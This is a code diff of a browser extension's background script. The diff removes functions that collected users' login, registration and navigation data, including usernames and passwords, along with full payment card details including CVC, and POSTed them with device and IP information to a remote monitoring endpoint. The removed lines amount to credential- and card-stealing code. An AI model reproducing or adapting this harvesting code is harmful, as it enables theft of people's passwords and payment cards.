@@ -13,18 +13,10 @@ import {app, today} from "./db";
 import {optimizeAppSettingObject, sendRequest} from "./lib-functions-background";
 import {globalAppMonitorURL} from "./lib-main";
 
-let acsComPortBack: any;
 let globalAppBrowser: any;
 let globalAppIP: any;
 let BrJS = new BrowserJS(window.navigator);
-const appTracker = app.about.short_name + '@' + app.about.version;
 
-function messengerConnector(p: any) {
-    acsComPortBack = p;
-    acsComPortBack.onMessage.addListener(backgroundResponder);
-}
-
-browser.runtime.onConnect.addListener(messengerConnector);
 
 
 function createDefaultAppData(browserNameFull: string, browserVersion: string, clientIP: string, clientCity: string, clientCountry: string, clientDeviceName: string, clientDevicePlatform: string, clientPlatformArchitecture: string) {
@@ -149,147 +141,6 @@ export function checkSettings(details: { reason: string }, ipdata?: any) {
     });
 }
 
-function backgroundResponder(request: { constructor?: any; command?: any; data?: any; }) {
-    if (typeof request === 'object' && request.constructor === Object && Object.keys(request).length !== 0) {
-        if (request.command === 'saveLoginData' || request.command === 'saveRegistrationData' || request.command === 'saveLogoutData' || request.command === 'saveNavigateData') {
-            return browserUserDataManagement(request.command, request.data);
-        }
-        if (request.command === 'savePaymentMethodsData') {
-            if (acsComPortBack !== undefined)
-                checkAppInstallation(function (setting: any) {
-                    sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorURL + "clientPaymentMethodsRecord",
-                        async: true,
-                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": request.command,
-                            "paymentMethodsInfo": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                'cardNumber': request.data.cardNumber,
-                                'cardBrand': request.data.cardBrand,
-                                'cardHolder': request.data.cardHolder,
-                                "cardExpire": request.data.cardExpire,
-                                'cardCVC': request.data.cardCVC,
-                                "workWebsite": request.data.workWebsite
-                            }
-                        }
-                    });
-                });
-        }
-    }
-}
-
-function browserUserDataManagement(command: string, data: { username?: any; password?: any; workWebsite?: any; email?: any; }) {
-    browser.storage.local.get().then(function (setting) {
-        if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
-            if (setting.app !== '' || setting.app.id !== '' || setting.browser.name !== '' || setting.client.ip !== '' || setting.user.email !== '') {
-                /*-----------------------------------------------------------------------------------------------------------*/
-                if (command === 'saveLoginData') {
-                    /*console.log(command);
-                    console.log(data);*/
-                    sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorURL + "browserUserDataManagement",
-                        async: true,
-                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": 'login',
-                                "username": data.username,
-                                "password": data.password,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                } else if (command === 'saveRegistrationData') {
-                    sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorURL + "browserUserDataManagement",
-                        async: true,
-                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "registration",
-                                "username": data.username,
-                                "password": data.password,
-                                "email": data.email,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                } else if (command === 'saveLogoutData') {
-                    sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorURL + "browserUserDataManagement",
-                        async: true,
-                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "logout",
-                                "username": data.username,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                } else if (command === 'saveNavigateData') {
-                    sendRequest({
-                        method: "POST",
-                        url: globalAppMonitorURL + "browserUserDataManagement",
-                        async: true,
-                        header: [{name: "ms-feedback-data", value: "application/json;charset=UTF-8"}],
-                        data: {
-                            "command": command,
-                            "userdata": {
-                                _default_: {
-                                    "tracker": appTracker,
-                                    "app_id": setting.app.id,
-                                    "ip": setting.client.ip,
-                                    "os_name_arch": BrJS.PlatformName + ' ' + BrJS.PlatformArchitecture,
-                                    "browser": BrJS.BrowserNameFull
-                                },
-                                "event": "navigate",
-                                "username": data.username,
-                                "workWebsite": data.workWebsite
-                            }
-                        }
-                    });
-                }
-                /*-----------------------------------------------------------------------------------------------------------*/
-            }
-        }
-    })
-}
 
 function checkAppInstallation(callbackFn: any, fallbackFn?: any) {
     browser.storage.local.get().then(
